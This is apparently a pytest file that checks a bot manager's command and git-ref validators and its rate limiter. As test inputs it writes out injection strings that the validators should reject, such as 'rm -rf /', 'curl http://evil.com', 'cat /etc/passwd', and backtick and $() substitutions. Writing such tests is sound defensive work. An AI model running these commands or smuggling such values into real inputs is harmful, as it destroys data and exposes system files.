import os
import pytest
from core.system.process_spawner import ProcessSpawner
from core.system.git_client import GitClient
from core.common.rate_limiter import InteractionRateLimiter
from core.config.models import BotConfig

def test_process_spawner_validate_command_blocks_dangerous_characters():
    # Dangerous commands
    assert not ProcessSpawner.validate_command("python app.py; rm -rf /")[0]
    assert not ProcessSpawner.validate_command("python app.py && curl http://evil.com")[0]
    assert not ProcessSpawner.validate_command("python app.py | sh")[0]
    assert not ProcessSpawner.validate_command("python app.py `id`")[0]
    assert not ProcessSpawner.validate_command("python app.py $(whoami)")[0]
    assert not ProcessSpawner.validate_command("python app.py > /dev/null")[0]
    assert not ProcessSpawner.validate_command("")[0]

    # Safe commands
    assert ProcessSpawner.validate_command("python app.py")[0]
    assert ProcessSpawner.validate_command("python -m bot.main --port 8080")[0]
    assert ProcessSpawner.validate_command("node server.js --env production")[0]

def test_process_spawner_spawn_rejects_injected_command():
    spawner = ProcessSpawner()
    injected_bot = BotConfig(
        id="evil_bot",
        name="EvilBot",
        path=".",
        cmd="python app.py; cat /etc/passwd",
        log="bot.log"
    )

    pid = spawner.spawn(injected_bot, env={})
    assert pid is None

def test_git_client_is_safe_ref_blocks_injection():
    # Dangerous refs
    assert not GitClient.is_safe_ref("origin/main; rm -rf /")
    assert not GitClient.is_safe_ref("origin/main && calc.exe")
    assert not GitClient.is_safe_ref("-u origin main")
    assert not GitClient.is_safe_ref("refs/heads/../../root")
    assert not GitClient.is_safe_ref("main | evil")
    assert not GitClient.is_safe_ref("")

    # Safe refs
    assert GitClient.is_safe_ref("origin/main")
    assert GitClient.is_safe_ref("main")
    assert GitClient.is_safe_ref("release/v2.1.0")
    assert GitClient.is_safe_ref("HEAD@{1}")
    assert GitClient.is_safe_ref("tag_2026-08-26")

def test_git_client_update_rejects_unsafe_branch(tmp_path):
    # Initialize a dummy git repo directory
    git_dir = tmp_path / ".git"
    git_dir.mkdir()

    client = GitClient()
    success, msg, changed, details = client.update_repo(str(tmp_path), branch="main; rm -rf /")
    assert not success
    assert "rejected" in msg.lower()

def test_interaction_rate_limiter_cooldown_and_reset():
    limiter = InteractionRateLimiter(default_cooldown=2.0)
    user_id = 987654321
    action = "restart"

    # First call: allowed
    limited, remaining = limiter.is_limited(user_id, action, cooldown=2.0)
    assert not limited
    assert remaining == 0.0

    # Immediate second call: blocked
    limited, remaining = limiter.is_limited(user_id, action, cooldown=2.0)
    assert limited
    assert remaining > 0.0

    # Reset specific user
    limiter.reset(user_id=user_id, action=action)
    limited, remaining = limiter.is_limited(user_id, action, cooldown=2.0)
    assert not limited

def test_process_spawner_systemd_privileges_check():
    has_privs, msg = ProcessSpawner.check_systemd_privileges()
    if os.name != 'posix':
        assert not has_privs
        assert "Linux/POSIX" in msg
